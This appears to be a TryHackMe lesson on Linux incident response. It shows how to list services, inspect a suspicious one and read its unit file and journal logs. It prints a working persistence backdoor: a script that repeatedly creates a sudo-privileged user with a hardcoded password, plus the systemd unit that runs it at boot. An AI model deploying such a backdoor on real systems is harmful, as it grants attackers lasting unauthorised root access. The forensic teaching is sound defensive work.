In Linux, services refer to various background processes or daemons that run continuously, performing tasks such as managing system resources, providing network services, or handling user requests. For example, the cron daemon we analysed previously ran the cronjobs. Other common services include SSH (sshd) for secure shell or the Apache HTTP Server (httpd). Typically, services are configured using the system's service management utility - **systemd** or **init**. Some environments like BusyBox, however, do not use systemd.

Services can be a target for attackers if they can exploit vulnerabilities, abuse misconfigurations, or manipulate legitimate services to establish persistence or escalate privileges on the system. For example, attackers might create new malicious services or modify existing ones to inject or execute malicious commands during system startup or ad-hoc if they can start and stop the service.

As such, incident responders need to have a pre-established baseline to detect anomalies and locate artefacts related to service abuse.

Enumerating Services

`systemctl` is a utility in Linux used for controlling **systemd** and service managers. As mentioned earlier, systemd is a service management utility in Unix-based systems and, for the most part, has replaced the traditional init system in many distributions. As such, systemd is responsible for managing the startup processes, services, and daemons on a Linux system, and `systemctl` lets us manage these services directly.

We can perform a number of actions using `systemctl`, including:

|   |   |
|---|---|
|`systemctl start <service>`|Starts the specified service.|
|`systemctl stop <service>`|Stops the specified service.|
|`systemctl restart <service>`|Restarts the specified service.|
|`systemctl enable <service>`|Enables the specified service to start automatically at boot.|
|`systemctl disable <service>`|Disables the specified service from starting automatically at boot.|
|`systemctl status <service>`|Displays the status of the specified service (e.g., Active, Inactive, Failed).|

We can also use `systemctl` to iterate and query all the services on the system using the following syntax:

Listing All System Services

```shell-session
investigator@tryhackme:~$ sudo systemctl list-units --all --type=service
```

This will produce a lot of paginated output. You can exit this window by pressing the `q` key or avoid pagination by including the `--no-pager` argument.

Alternatively, we can limit the output to just currently running services with the following command:

Listing Running Services

```shell-session
investigator@tryhackme:~$ sudo systemctl list-units --type=service --state=running
  UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION                                                   
  accounts-daemon.service                        loaded active running Accounts Service                                              
  acpid.service                                  loaded active running ACPI event daemon                                                                                     
  atd.service                                    loaded active running Deferred execution scheduler                                  
  b4ckd00rftw.service                            loaded active running                                
  cron.service                                   loaded active running Regular background
  ...
```

For the most part, the services returned are seemingly benign. However, we can't be sure as we only see the service name and descriptions based on their unit files. However, at this stage, we are looking for additional services that appear out of place or deviate from the standard baseline. The above output shows an interesting service with the name `b4ckd00rftw.service`, which warrants further investigation.

Investigating Service Processes and Binaries

Now that we have identified a suspicious service, we can use `systemctl` to query the service's status, metadata, and other configurations to understand better what the service is doing.

To query the service's status, we can use the following command:

Viewing the Backdoor Service

```shell-session
investigator@tryhackme:~$ sudo systemctl status b4ckd00rftw.service
b4ckd00rftw.service - Backdoor Service
     Loaded: loaded (/etc/systemd/system/b4ckd00rftw.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2024-03-13 18:38:06 UTC; 1h 20min ago
   Main PID: 596 (b4ckd00rftw.sh)
      Tasks: 2 (limit: 1126)
     Memory: 6.4M
     CGroup: /system.slice/b4ckd00rftw.service
             ├─ 596 /bin/bash /usr/local/bin/b4ckd00rftw.sh
             ├─4067 sleep 60
```

In the above output, we gain a lot of details about the **b4ckd00rftw** service. Notably, we can see that it is in the **Active** and **Running** state, as well as the timestamp for when the service started previously.

The command has also returned the **Main PID** value, which identifies the main process of this service and its associated executable (**b4ckd00rftw.sh**). Moving further, we gain valuable information with the **CGroup** (Control Group) field, which returns two processes spawned from this service.

The first process reveals the absolute path of the service executable script (`/usr/local/bin/b4ckd00rftw.sh`), and the second process reveals that it continually runs every 60 seconds (`sleep 60`).

Now that we know the binary that is executed when this service starts, we can perform further investigation on the script's contents:

Viewing the Executable Associated with the Backdoor Service

```shell-session
investigator@tryhackme:~$ cat /usr/local/bin/b4ckd00rftw.sh
#!/bin/bash

while true; do
    sudo useradd -m -p $(openssl passwd -1 Password123!) b4ckd00rftw
    sudo usermod -aG sudo b4ckd00rftw
    sleep 60
done
```

By dissecting the commands within this script, we can determine that it creates a new user with sudo privileges named **b4ckd00rftw** and then sleeps for 60 seconds before repeating the process indefinitely.

Judging by the contents of this script, it is clear that this is another persistence mechanism that the attacker who compromised this system configured to maintain unauthorised access to the system even if initial response actions (like removing the backdoor user) are performed. This type of persistence is why it's important to perform thorough analysis and restore systems from a known-good backup instead of attempting to remediate on a live system, which may not fully address the extent of the compromise.

Inspecting Service Configuration Files

Service configuration files, often called unit files in systemd-based Linux distributions, are important for managing and defining services. These files provide systemd with the necessary information to control how a service behaves, including its startup behavior, dependencies, environment variables, and more. In the previous section, we used the `systemctl status` command to list this configuration data for the backdoor service. By querying the status of a service, the system reads from the unit file to collect this information.

We can read the unit file directly if we know its location, typically in the `/etc/systemd/system/` directory. However, when we queried the status of the service directly, we were given the absolute path of the unit file: `/etc/systemd/system/b4ckd00rftw.service`. We can read the file with the following command:

Viewing the Backdoor Service Unit File

```shell-session
investigator@tryhackme:~$ cat /etc/systemd/system/b4ckd00rftw.service
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/b4ckd00rftw.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

As seen above, we received similar information to what we received by querying the service's status. Notably, the `ExecStart` value gives us the absolute path of the script or binary executed when the service starts.

Inspecting Service Logs

Service log files contain valuable information about the activities, status, and errors generated by services on the system. These logs can be valuable for analysts when investigating services during an incident. The easiest way to query and view service logs from the systemd journal (the systemd logging service) is through the `journalctl` command.

To view the logs of a specific service (i.e., the backdoor service) in real time, we can run the following command:

Viewing the Backdoor Service Logs

```shell-session
investigator@tryhackme:~$ sudo journalctl -f -u b4ckd00rftw.service
-- Logs begin at Sun 2022-02-27 13:52:14 UTC. --

Mar 13 20:03:33 tryhackme sudo[4177]:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd -m -p $1$wBUkwyjH$cTZA1K8hQqW6Spxf/en/I/ b4ckd00rftw
Mar 13 20:03:33 tryhackme sudo[4177]: pam_unix(sudo:session): session opened for user root by (uid=0)
Mar 13 20:03:33 tryhackme b4ckd00rftw.sh[4178]: useradd: user 'b4ckd00rftw' already exists
Mar 13 20:03:33 tryhackme useradd[4178]: failed adding user 'b4ckd00rftw', data deleted
Mar 13 20:03:33 tryhackme sudo[4177]: pam_unix(sudo:session): session closed for user root
Mar 13 20:03:33 tryhackme sudo[4179]:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo b4ckd00rftw
Mar 13 20:03:33 tryhackme sudo[4179]: pam_unix(sudo:session): session opened for user root by (uid=0)
Mar 13 20:03:33 tryhackme sudo[4179]: pam_unix(sudo:session): session closed for user root
Mar 13 20:03:33 tryhackme b4ckd00rftw.sh[596]: THM{********************************}
```

To exit from this output, you can press `Ctrl` + `C`.

In the above output, we continuously monitor and display new log entries related to the **b4ckd00rftw.service** unit in real time. As seen in the output, we receive some details on the various actions performed by the service, such as the **useradd** command, which is part of the service binary we investigated earlier, along with correlated timestamps.

Note that if you do not want to follow the logs in real time, you can omit the `-f` argument.

Inspecting a service's logs quickly can be useful for troubleshooting. When responding to incidents, service logs can be extremely helpful in identifying unexpected behaviour or malicious executions in real time.